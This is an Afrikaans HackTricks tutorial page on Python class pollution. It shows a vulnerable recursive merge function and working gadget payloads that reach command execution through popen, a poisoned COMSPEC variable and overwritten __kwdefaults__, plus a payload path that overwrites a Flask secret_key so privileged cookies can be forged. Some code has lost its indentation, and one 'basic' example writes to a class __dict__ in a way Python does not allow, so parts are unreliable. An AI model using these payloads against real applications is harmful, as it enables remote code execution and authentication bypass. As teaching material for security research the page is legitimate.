# Class Pollution (Python's Prototype Pollution)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>

## Basiese Voorbeeld

Kyk hoe dit moontlik is om klasse van voorwerpe met strings te verontreinig:

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## Basiese Kwesbaarheidsvoorbeeld

Consider the following Python code:

Beskou die volgende Python-kode:

```python
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

person = Person("Alice", 25)
print(person.name)
```

This code defines a `Person` class with a constructor that takes in a `name` and an `age`. It then creates an instance of the `Person` class with the name "Alice" and age 25, and prints out the name of the person.

Hierdie kode definieer 'n `Person`-klas met 'n konstrukteur wat 'n `name` en 'n `age` aanvaar. Dit skep dan 'n instansie van die `Person`-klas met die naam "Alice" en ouderdom 25, en druk die naam van die persoon uit.

Now, let's say an attacker is able to modify the `Person` class prototype and add a new method called `get_password`:

Nou, stel ons sê 'n aanvaller kan die `Person`-klas se prototipe wysig en 'n nuwe metode genaamd `get_password` byvoeg:

```python
Person.__dict__["get_password"] = lambda self: "password123"
```

The attacker can then call the `get_password` method on the `person` instance:

Die aanvaller kan dan die `get_password`-metode op die `person`-instansie aanroep:

```python
print(person.get_password())
```

This will print out the string "password123", even though the `get_password` method was never defined in the original `Person` class.

Dit sal die string "password123" uitdruk, selfs al is die `get_password`-metode nooit in die oorspronklike `Person`-klas gedefinieer nie.

This is an example of class pollution or prototype pollution vulnerability. By modifying the class prototype, the attacker is able to add or modify methods and properties of the class at runtime, potentially leading to unauthorized access or manipulation of data.

Dit is 'n voorbeeld van 'n klasverontreiniging of prototipeverontreiniging-kwesbaarheid. Deur die klasprototipe te wysig, kan die aanvaller metodes en eienskappe van die klas byvoeg of wysig tydens uitvoering, wat moontlik kan lei tot ongemagtigde toegang of manipulasie van data.

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## Voorbeelde van Gadget

<details>

<summary>Skep klas eienskap se verstekwaarde na RCE (subproses)</summary>

\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }

recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"

## Create default value for Employee.custom\_command

merge(USER\_INPUT, recruiter\_emp)

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"

````
</details>

<details>

<summary>Vervuiling van ander klasse en globale vars deur middel van <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
````

</details>

<details>

<summary>Willekeurige onderprocesuitvoering</summary>

\`\`\`python import subprocess, json

class Employee: def **init**(self): pass

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

## Overwrite env var "COMSPEC" to execute a calc

USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value

merge(USER\_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up

````
</details>

<details>

<summary>Oorskrywing van <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** is 'n spesiale eienskap van alle funksies, gebaseer op Python [dokumentasie](https://docs.python.org/3/library/inspect.html), dit is 'n "afbeelding van enige verstekwaardes vir **slegs-sleutelwoord** parameters". Deur hierdie eienskap te besoedel, kan ons die verstekwaardes van slegs-sleutelwoord parameters van 'n funksie beheer, dit is die funksie se parameters wat na \* of \*args kom.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
````

</details>

<details>

<summary>Oorskryf Flask-geheim regoor lêers</summary>

So, as jy 'n klasvervuiling kan doen oor 'n voorwerp wat in die hoof Python-lêer van die web gedefinieer is, **maar waarvan die klas in 'n ander lêer gedefinieer is** as die hoof een. Omdat jy in die vorige payloads toegang tot \_\_globals\_\_ moet hê, moet jy toegang tot die klas van die voorwerp of metodes van die klas hê, sal jy in staat wees om **die globals in daardie lêer te benader, maar nie in die hoof een nie**.\
Daarom sal jy **nie toegang hê tot die Flask-app globale voorwerp** wat die **geheime sleutel** in die hoofbladsy gedefinieer het nie:

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

In hierdie scenario het jy 'n toestel nodig om deur lêers te beweeg om by die hooflêer te kom om toegang te verkry tot die globale objek `app.secret_key` om die Flask-geheime sleutel te verander en sodoende [voorregte te verhoog deur hierdie sleutel te ken](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

'n Nutslading soos hierdie een [uit hierdie skryfstuk](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

Gebruik hierdie payload om **`app.secret_key`** (die naam in jou app mag verskil) te verander sodat jy nuwe en meer bevoorregte flask koekies kan teken.

</details>

Kyk ook na die volgende bladsy vir meer slegs-lees gadgets:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## Verwysings

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
